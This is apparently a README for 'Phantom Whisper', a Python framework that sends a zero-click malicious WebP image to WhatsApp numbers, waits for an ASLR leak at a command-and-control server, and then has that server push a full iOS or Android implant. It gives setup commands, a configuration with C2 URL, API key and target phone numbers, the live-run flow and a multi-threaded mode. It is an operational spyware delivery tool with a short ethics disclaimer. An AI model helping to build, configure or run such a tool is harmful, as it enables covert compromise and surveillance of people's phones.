# Phantom Whisper — Step‑by‑Step Usage Guide

*A zero‑to‑green‑check walkthrough*

> \*\*Ethics First 🚨  \*\*Deploy **only** against devices you own **or** have **written consent** to test. You are fully responsible for legality & ethics.

---

## What is Phantom Whisper?

A Python 3 framework that

1. **Delivers** a prepared WebP zero‑click payload to WhatsApp targets.
2. **Polls** your C2 for an ASLR leak proving initial compromise.
3. **Triggers** download/execute of a full implant (iOS or Android).
4. **Logs** every step to JSON‑lines for audit‑grade traceability.

The code is single‑host & sequential today, but architected for multi‑threaded scale tomorrow.

---

## 1  Prerequisites

| Requirement                 | Why                                                                | Quick Check                      |
| --------------------------- | ------------------------------------------------------------------ | -------------------------------- |
| **Python 3.9+**             | Modern typing, `pydantic‑settings`, f‑strings                      | `python3 --version`              |
| `virtualenv` / `pyenv`      | Isolate project dependencies                                       | *(strongly recommended)*         |
| **Git + GCC/Clang**         | Clone repo & compile any C‑backed wheels                           | `git --version`, `gcc --version` |
| Out‑of‑scope test device(s) | **Only for ethical testing**—never target without explicit consent | Verify IMEI / device ID          |

> 💡 *A C compiler is usually **optional**—all current wheels are pre‑built.*

---

## 2  Clone & Install

```bash
# 2.1 Clone the repository
$ git clone https://github.com/exfil0/phantom_whisper.git
$ cd phantom_whisper

# 2.2 Create & activate a virtual environment
$ python3 -m venv .venv
$ source .venv/bin/activate       # Windows: .venv\Scripts\activate

# 2.3 Install runtime dependencies
$ pip install -r requirements.txt
```

---

## 3  Configure Environment

Create a file named **`.env`** *in the project root*:

```dotenv
# Required
C2_API_KEY=REPLACE_ME

# Optional overrides
C2_SERVER_BASE_URL=https://c2.example.com
TARGET_WHATSAPP_IDS="+15551234567,+447911123456"
OS_TYPE=android                # ios (default) | android
```

The `Settings` model (see `config.py`) automatically ingests these at runtime.

---

## 4  Payload & Target Prep

1. **Payload** – place your malicious WebP at **`payloads/malicious_webp.bin`**.
2. **Targets** – supply IDs via `TARGET_WHATSAPP_IDS` **or** edit the default list in `config.py`.

---

## 5  Smoke Test (Dry‑Run)

```bash
$ python -m phantom_whisper.orchestrator
```

*Expect:*

* Console output in plain text.
* `logs/phantom_whisper.log` containing structured JSON lines.
* **Zero** outbound C2 traffic unless your `.env` is fully populated.

---

## 6 Live Execution ⚠️

> **Ensure you have legal authority & written permission before proceeding.**

```bash
# Verify C2 reachability, VPN/lab network, etc.
$ python -m phantom_whisper.orchestrator
```

### Execution Flow (per target)

1. **Init clients** `C2Client` + `WhatsAppTransport` (per‑target context).
2. **Send payload** Zero‑click WebP delivery.
3. **Poll for leak** Exponential back‑off until ASLR address received.
4. **Deploy implant** Command C2 to push the full binary.

| Exit Code | Meaning                           |
| --------- | --------------------------------- |
|  `0`      | All targets succeeded             |
|  `N > 0`  |  `N` targets failed orchestration |

---

## 7 Logging & Telemetry

| Channel | Location                     | Format        |
| ------- | ---------------------------- | ------------- |
| Console | STDOUT                       | Plain text    |
| File    | `./logs/phantom_whisper.log` | JSON‑per‑line |

Each entry contains: `timestamp`, `session_id`, `payload_hash`, `target_id`, log level, and message.

> **Tip:** Ship the log file to ELK, Splunk, or simply `jq` for ad‑hoc forensics.

---

## 8  Parallel Mode (Optional)

Uncomment the `ThreadPoolExecutor` block in `orchestrator.py` and set `MAX_WORKERS` in your `.env`.

---

## 9  Cleanup

```bash
$ deactivate                        # leave venv
$ rm -rf .venv logs/*.log           # nuke env & logs
```

---

## 10  Troubleshooting

| Symptom                        | Likely Cause                               | Remedy                                                       |
| ------------------------------ | ------------------------------------------ | ------------------------------------------------------------ |
| `ConnectionError`              | Bad C2 URL / network issues                | Verify `C2_SERVER_BASE_URL`, VPN, firewall                   |
| `PayloadError`                 | Missing WebP file                          | Check `payloads/malicious_webp.bin` path                     |
| `C2ResponseSchemaError`        | C2 JSON doesn’t match expected schema      | Update C2 server or adjust client                            |
| Exit code > 0                  | Target orchestration failures              | Inspect `phantom_whisper.log` `ERROR` entries                |
| `AttributeError` / `NameError` | Missing dependency or wrong Python version | Re‑run `pip install -r requirements.txt`; ensure Python 3.9+ |

---

### Next Steps

* **Real WhatsApp transport** – replace simulator.
* **CLI flags** – for headless operation & overrides.
* **PyInstaller bundle** – single‑file distribution.
* **gRPC‑based C2** – flexible backend protocol.

PRs welcome

---

## License
Internal proof‑of‑concept — no public license. Contact the author for usage terms.

---

**Happy hunting & stay ethical!**
